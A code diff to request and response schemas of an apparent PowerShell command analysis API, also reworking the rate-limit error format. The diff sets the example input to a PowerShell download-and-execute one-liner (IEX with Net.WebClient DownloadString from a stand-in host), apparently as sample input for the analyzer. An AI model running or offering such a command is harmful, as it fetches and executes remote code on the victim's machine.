@@ -8,9 +8,7 @@ from datetime import datetime
 
 class AnalyzeCommandRequest(BaseModel):
     """Schema for PowerShell command analysis request"""
-    command: str = Field(..., description="PowerShell command to analyze", max_length=10000, example="Get-Process")
-    
-    
+    command: str = Field(..., description="PowerShell command to analyze", max_length=10000, example="IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')")
     user_id: Optional[str] = Field(None, description="User ID (if authenticated)")
     ip_address: Optional[str] = Field(None, description="Client IP address")
     user_agent: Optional[str] = Field(None, description="User agent string")
@@ -31,6 +29,14 @@ class AnalyzeCommandRequest(BaseModel):
         if len(v) == 0:
             raise ValueError("Command cannot be empty")
         return v
+
+    model_config = {
+        "json_schema_extra": {
+            "example": {
+                "command": "IEX(New-Object Net.WebClient).DownloadString('http://bad.site/payload.ps1')"
+            }
+        }
+    }
 
 
 class CreateUserSessionRequest(BaseModel):
@@ -202,23 +208,23 @@ class ErrorResponse(BaseModel):
 
 class RateLimitResponse(BaseModel):
     """Schema for rate limit response"""
-    error: str
+    error: Dict[str, Any]
     rate_limit_info: Dict[str, Any]
     session_id: str
-    message: str
     
     model_config = {
         "json_schema_extra": {
             "example": {
-                "error": "Rate limit exceeded",
+                "error": {
+                    "code": "QuotaExceededError",
+                    "message": "You have exceeded one of your quotas (minute, daily or monthly). Daily quotas are reset every day at 00:00 UTC."                },
                 "rate_limit_info": {
-                    "current_count": 6,
-                    "limit": 5,
-                    "window_seconds": 60,
-                    "seconds_until_reset": 45
+                    "current_count": 11,
+                    "limit": 10,
+                    "window_seconds": 3600,
+                    "seconds_until_reset": 3599
                 },
-                "session_id": "session-uuid",
-                "message": "You have made 6 searches. Please wait 45 seconds before trying again."
+                "session_id": "session-uuid"
             }
         }
     }
